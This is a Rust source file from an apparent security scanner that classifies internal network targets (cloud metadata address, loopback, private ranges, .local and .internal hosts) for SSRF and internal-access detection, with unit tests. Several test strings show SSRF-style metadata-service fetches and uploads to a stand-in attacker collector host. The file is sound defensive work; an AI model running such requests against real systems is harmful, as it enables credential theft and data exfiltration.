use std::net::{Ipv4Addr, Ipv6Addr};

use super::model::NetworkTarget;
use crate::detectors::network::patterns::{RE_RFC1918_10, RE_RFC1918_172, RE_RFC1918_192};
use crate::lazy_pattern;

const METADATA_SERVICE_IPV4: Ipv4Addr = Ipv4Addr::new(169, 254, 169, 254);
const RFC1918_10_PREFIX: u8 = 10;
const RFC1918_172_PREFIX: u8 = 172;
const RFC1918_172_MIN_SECOND_OCTET: u8 = 16;
const RFC1918_172_MAX_SECOND_OCTET: u8 = 31;
const RFC1918_192_PREFIX: u8 = 192;
const RFC1918_192_SECOND_OCTET: u8 = 168;
const TARGET_PRIORITY_ORDER: &[NetworkTarget] = &[
    NetworkTarget::MetadataService,
    NetworkTarget::Loopback,
    NetworkTarget::Localhost,
    NetworkTarget::BindAll,
    NetworkTarget::Rfc1918_10,
    NetworkTarget::Rfc1918_192,
    NetworkTarget::Rfc1918_172,
    NetworkTarget::InternalDomain,
    NetworkTarget::LocalDomain,
];

lazy_pattern!(
    RE_URL_WITH_SCHEME,
    r#"(?i)\b[a-z][a-z0-9+.-]*://[^\s"'`)]+"#
);

// Hostname-shaped `*.local` matcher. A plain `lower.contains(".local")`
// substring check fired on filesystem paths that happen to contain the
// literal four chars `.local` — `~/.local/bin`,
// `node_modules/.local-cache`, `xdg.local-config`. These are not mDNS
// hostnames and must not classify as `LocalDomain`. The pattern requires:
// * A leading word boundary so we don't match suffixes inside identifiers.
// * A label-shaped prefix (`[a-z0-9-]{1,63}`) before the dot.
// * `.local` followed by a non-label, non-dash character or end-of-string,
//   keeping `printer.local` while rejecting `.local-cache`.
lazy_pattern!(
    RE_LOCAL_DOMAIN,
    r"\b[a-z0-9][a-z0-9-]{0,62}\.local(?:[^a-z0-9-]|$)"
);

// Same shape for `.internal` mDNS-style hostnames.
lazy_pattern!(
    RE_INTERNAL_DOMAIN,
    r"\b[a-z0-9][a-z0-9-]{0,62}\.internal(?:[^a-z0-9-]|$)"
);

// IPv6 loopback in any of its canonical forms. Pre-fix the classifier
// covered IPv4 only (`127.0.0.1`, RFC1918), so a request like
// `requests.get('http://[::1]:8080/admin')` did not produce
// `INTERNAL_NETWORK_ACCESS` or `SSRF_LIKE_FETCH` — both rules gated on
// `has_internal_target` which was driven by `classify_internal_network_target`.
// Recognised forms: `::1` (canonical), `[::1]` (URL bracket form),
// `0:0:0:0:0:0:0:1` (full uncompressed), and `::ffff:127.0.0.1`
// (IPv4-mapped IPv6 loopback). All require non-identifier-byte
// boundaries on either side so identifiers like `foo::1` or
// `bar::1abc` do not match.
lazy_pattern!(
    RE_IPV6_LOOPBACK,
    r"(?:^|[^A-Za-z0-9_:])(?:\[::1\]|::1|0:0:0:0:0:0:0:1|::ffff:127\.0\.0\.1)(?:[^A-Za-z0-9_:]|$)"
);

fn classify_internal_network_target(content: &str) -> Option<NetworkTarget> {
    let lower = content.to_ascii_lowercase();
    debug_assert_eq!(
        lower.len(),
        content.len(),
        "ASCII lowercase must preserve URL match byte ranges"
    );
    let mut masked = lower;
    let mut url_target = None;

    for url_match in RE_URL_WITH_SCHEME.find_matches(content) {
        if let Ok(url) = url::Url::parse(url_match.matched_text.as_str()) {
            if let Some(target) = classify_url_authority(&url) {
                url_target = Some(match url_target {
                    Some(existing) => preferred_target(existing, target),
                    None => target,
                });
            }
            let spaces = " ".repeat(url_match.end - url_match.start);
            masked.replace_range(url_match.start..url_match.end, &spaces);
        }
    }

    match (
        url_target,
        classify_internal_network_target_in_lowercase(&masked),
    ) {
        (Some(url_target), Some(text_target)) => Some(preferred_target(url_target, text_target)),
        (Some(target), None) | (None, Some(target)) => Some(target),
        (None, None) => None,
    }
}

fn classify_url_authority(url: &url::Url) -> Option<NetworkTarget> {
    match url.host()? {
        url::Host::Domain(host) => classify_domain_host(host),
        url::Host::Ipv4(addr) => classify_ipv4_address(addr),
        url::Host::Ipv6(addr) => classify_ipv6_address(addr),
    }
}

fn classify_domain_host(host: &str) -> Option<NetworkTarget> {
    let lower = crate::net_util::normalize_host(host);
    if crate::net_util::host_is_localhost(&lower) {
        Some(NetworkTarget::Localhost)
    } else if RE_INTERNAL_DOMAIN.is_match(&lower) {
        Some(NetworkTarget::InternalDomain)
    } else if RE_LOCAL_DOMAIN.is_match(&lower) {
        Some(NetworkTarget::LocalDomain)
    } else {
        None
    }
}

fn classify_ipv6_address(addr: Ipv6Addr) -> Option<NetworkTarget> {
    if addr == Ipv6Addr::LOCALHOST {
        Some(NetworkTarget::Loopback)
    } else {
        addr.to_ipv4_mapped().and_then(classify_ipv4_address)
    }
}

fn classify_ipv4_address(addr: Ipv4Addr) -> Option<NetworkTarget> {
    let [first, second, _, _] = addr.octets();
    if addr == METADATA_SERVICE_IPV4 {
        Some(NetworkTarget::MetadataService)
    } else if addr == Ipv4Addr::LOCALHOST {
        Some(NetworkTarget::Loopback)
    } else if addr == Ipv4Addr::UNSPECIFIED {
        Some(NetworkTarget::BindAll)
    } else if first == RFC1918_10_PREFIX {
        Some(NetworkTarget::Rfc1918_10)
    } else if first == RFC1918_192_PREFIX && second == RFC1918_192_SECOND_OCTET {
        Some(NetworkTarget::Rfc1918_192)
    } else if first == RFC1918_172_PREFIX
        && (RFC1918_172_MIN_SECOND_OCTET..=RFC1918_172_MAX_SECOND_OCTET).contains(&second)
    {
        Some(NetworkTarget::Rfc1918_172)
    } else {
        None
    }
}

fn preferred_target(left: NetworkTarget, right: NetworkTarget) -> NetworkTarget {
    if target_priority(right) < target_priority(left) {
        right
    } else {
        left
    }
}

fn target_priority(target: NetworkTarget) -> usize {
    TARGET_PRIORITY_ORDER
        .iter()
        .position(|candidate| *candidate == target)
        .unwrap_or(TARGET_PRIORITY_ORDER.len())
}

fn classify_internal_network_target_in_lowercase(lower: &str) -> Option<NetworkTarget> {
    if lower.contains("169.254.169.254") {
        Some(NetworkTarget::MetadataService)
    } else if lower.contains("127.0.0.1") || RE_IPV6_LOOPBACK.is_match(lower) {
        Some(NetworkTarget::Loopback)
    } else if lower.contains("localhost") {
        Some(NetworkTarget::Localhost)
    } else if looks_like_bind_all(lower) {
        Some(NetworkTarget::BindAll)
    } else if RE_RFC1918_10.is_match(lower) {
        Some(NetworkTarget::Rfc1918_10)
    } else if RE_RFC1918_192.is_match(lower) {
        Some(NetworkTarget::Rfc1918_192)
    } else if RE_RFC1918_172.is_match(lower) {
        Some(NetworkTarget::Rfc1918_172)
    } else if RE_INTERNAL_DOMAIN.is_match(lower) {
        Some(NetworkTarget::InternalDomain)
    } else if RE_LOCAL_DOMAIN.is_match(lower) {
        Some(NetworkTarget::LocalDomain)
    } else {
        None
    }
}

/// Classify internal targets from URL authorities and non-URL text.
///
/// # Contract
///
/// URL path, query, fragment, and userinfo text are not endpoint hosts. A
/// string such as `https://collector.example/path@localhost` must not classify
/// as loopback unless an internal host also appears outside the URL or in a URL
/// authority.
pub(crate) fn contains_internal_network_target(content: &str) -> Option<NetworkTarget> {
    classify_internal_network_target(content)
}

/// Check whether `text` contains `0.0.0.0` as a standalone IP address
/// rather than as a substring of a longer dotted quad like `10.0.0.0`
/// or `100.0.0.0`. Pre-fix a plain `contains("0.0.0.0")` matched
/// `10.0.0.0` because the four-character substring appears starting at
/// index 1 (`1[0.0.0.0]`), misclassifying the RFC1918 /8 network address
/// as `BindAll`.
pub(crate) fn looks_like_bind_all(text: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = text[start..].find("0.0.0.0") {
        let abs = start + pos;
        let before_ok = abs == 0 || !text.as_bytes()[abs - 1].is_ascii_digit();
        let after = abs + "0.0.0.0".len();
        let after_ok = after >= text.len() || !text.as_bytes()[after].is_ascii_digit();
        if before_ok && after_ok {
            return true;
        }
        start = abs + 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_metadata_service_as_special_target() {
        assert_eq!(
            contains_internal_network_target("fetch http://169.254.169.254/latest/meta-data"),
            Some(NetworkTarget::MetadataService)
        );
    }

    #[test]
    fn classify_rfc1918_and_local_domains() {
        assert_eq!(
            contains_internal_network_target("curl http://10.1.2.3/health"),
            Some(NetworkTarget::Rfc1918_10)
        );
        assert_eq!(
            contains_internal_network_target("curl http://db.internal/health"),
            Some(NetworkTarget::InternalDomain)
        );
    }

    /// Contract: filesystem paths containing the literal substring `.local`
    /// MUST NOT classify as `LocalDomain`. The naive `contains` check
    /// surfaced `~/.local/bin`, `node_modules/.local-cache`, etc as mDNS
    /// hostnames, polluting taint and risk analysis.
    #[test]
    fn classify_does_not_treat_dot_local_filesystem_paths_as_local_domain() {
        for path in [
            "config = ~/.local/bin",
            "loaded $HOME/.local/share/foo",
            "include node_modules/.local-cache",
        ] {
            assert_eq!(
                contains_internal_network_target(path),
                None,
                "Filesystem path '{path}' must NOT classify as LocalDomain"
            );
        }
    }

    /// Sanity: actual `*.local` hostnames still classify.
    #[test]
    fn classify_accepts_legitimate_mdns_hostnames() {
        assert_eq!(
            contains_internal_network_target("printer.local"),
            Some(NetworkTarget::LocalDomain)
        );
        assert_eq!(
            contains_internal_network_target("ssh user@build.local /tmp"),
            Some(NetworkTarget::LocalDomain)
        );
    }

    /// # Contract
    ///
    /// IPv6 loopback in every canonical form MUST classify as
    /// `Loopback`. Pre-fix the classifier handled IPv4 only, so an
    /// HTTP request to `[::1]:8080` did not produce
    /// `INTERNAL_NETWORK_ACCESS` or `SSRF_LIKE_FETCH` because
    /// `has_internal_target` (driven by this classifier) was `false`.
    /// IPv6-only deployments and dual-stack hosts that prefer `::1`
    /// over `127.0.0.1` were silently exempt from the internal-network
    /// detector.
    #[test]
    fn classify_recognises_ipv6_loopback_forms() {
        for sample in [
            "requests.get('http://[::1]:8080/admin')",
            "curl http://[::1]/health",
            "fetch('http://0:0:0:0:0:0:0:1/x')",
            "curl http://[::ffff:127.0.0.1]/x",
            "ssh ::1",
        ] {
            assert_eq!(
                contains_internal_network_target(sample),
                Some(NetworkTarget::Loopback),
                "IPv6 loopback in {sample:?} must classify as Loopback"
            );
        }
    }

    /// # Contract
    ///
    /// Internal-looking URL path and userinfo text MUST NOT classify as an
    /// internal endpoint. The network target is the URL authority; path text
    /// such as `/localhost/` and userinfo such as `localhost@host` are remote
    /// requests when the authority host is remote.
    #[test]
    fn classify_uses_url_authority_not_path_or_userinfo() {
        for sample in [
            "curl https://collector.attacker-control.io/localhost/collect",
            "curl https://collector.attacker-control.io/127.0.0.1/collect",
            "requests.get('https://collector.attacker-control.io/path@169.254.169.254/latest')",
            "fetch('https://localhost@collector.attacker-control.io/upload')",
            "GET https://collector.attacker-control.io/service.internal/status",
            "fetch('https://localhost.attacker-control.io/upload')",
            "fetch('https://127.0.0.1.attacker-control.io/upload')",
        ] {
            assert_eq!(
                contains_internal_network_target(sample),
                None,
                "remote URL path or userinfo must not classify as an internal target: {sample:?}"
            );
        }
    }

    /// # Contract
    ///
    /// Masking URL spans must not hide bare internal targets elsewhere in the
    /// same artifact, and authority hosts remain the source of truth for URL
    /// endpoints.
    #[test]
    fn classify_preserves_authority_and_bare_internal_targets() {
        assert_eq!(
            contains_internal_network_target(
                "curl https://collector.attacker-control.io/a && probe localhost"
            ),
            Some(NetworkTarget::Localhost)
        );
        assert_eq!(
            contains_internal_network_target("curl https://localhost:8443/admin"),
            Some(NetworkTarget::Localhost)
        );
        assert_eq!(
            contains_internal_network_target("fetch('http://169.254.169.254/latest/meta-data')"),
            Some(NetworkTarget::MetadataService)
        );
        assert_eq!(
            contains_internal_network_target("fetch('http://[::ffff:169.254.169.254]/latest')"),
            Some(NetworkTarget::MetadataService)
        );
        assert_eq!(
            contains_internal_network_target("fetch('http://[::ffff:10.0.0.1]/internal')"),
            Some(NetworkTarget::Rfc1918_10)
        );
    }

    /// # Contract (negative)
    ///
    /// Identifier-shaped substrings that contain `::1` as a fragment
    /// of a larger token (Rust paths like `module::foo::1` are not
    /// possible because numeric segments are illegal there, but
    /// configuration tokens like `foo::1abc` exist in some YAMLs)
    /// MUST NOT classify as Loopback. Pins the boundary check on
    /// `RE_IPV6_LOOPBACK` so a future loosening cannot accidentally
    /// re-introduce identifier collisions.
    #[test]
    fn classify_does_not_treat_identifier_substrings_as_ipv6_loopback() {
        for sample in ["tag = foo::1abc", "version = ::1xy", "let x = id::1234"] {
            assert_eq!(
                contains_internal_network_target(sample),
                None,
                "identifier substring {sample:?} must NOT classify as Loopback"
            );
        }
    }

    /// # Contract
    ///
    /// `0.0.0.0` as a standalone IP MUST classify as `BindAll`. This is
    /// the happy path that existed before the word-boundary fix.
    #[test]
    fn classify_bind_all_ip() {
        assert_eq!(
            contains_internal_network_target("bind http://0.0.0.0:8080"),
            Some(NetworkTarget::BindAll)
        );
        assert_eq!(
            contains_internal_network_target("listen 0.0.0.0"),
            Some(NetworkTarget::BindAll)
        );
    }

    /// # Contract
    ///
    /// IPs that *contain* `0.0.0.0` as a substring (like `10.0.0.0`
    /// or `100.0.0.0`) MUST NOT classify as `BindAll`. Pre-fix a plain
    /// `contains("0.0.0.0")` matched `10.0.0.0` because the substring
    /// starts at index 1 (`1[0.0.0.0]`), misclassifying the RFC1918 /8
    /// network address.
    #[test]
    fn classify_does_not_misclassify_rfc1918_10_as_bind_all() {
        assert_eq!(
            contains_internal_network_target("http://10.0.0.0/"),
            Some(NetworkTarget::Rfc1918_10),
            "10.0.0.0 must classify as Rfc1918_10, not BindAll"
        );
        assert_eq!(
            contains_internal_network_target("100.0.0.0"),
            None,
            "100.0.0.0 must not classify as BindAll"
        );
    }

    /// # Contract
    ///
    /// `looks_like_bind_all` requires digit boundaries on both sides of
    /// `0.0.0.0`. The standalone address matches; substrings embedded in
    /// larger dotted quads do not.
    #[test]
    fn looks_like_bind_all_distinguishes_standalone_from_substring() {
        assert!(looks_like_bind_all("0.0.0.0"));
        assert!(looks_like_bind_all("http://0.0.0.0:8080"));
        assert!(
            !looks_like_bind_all("10.0.0.0"),
            "10.0.0.0 contains 0.0.0.0 but is not BindAll"
        );
        assert!(
            !looks_like_bind_all("100.0.0.0"),
            "100.0.0.0 contains 0.0.0.0 but is not BindAll"
        );
        assert!(
            !looks_like_bind_all("0.0.0.01"),
            "trailing digit makes this not 0.0.0.0"
        );
    }
}
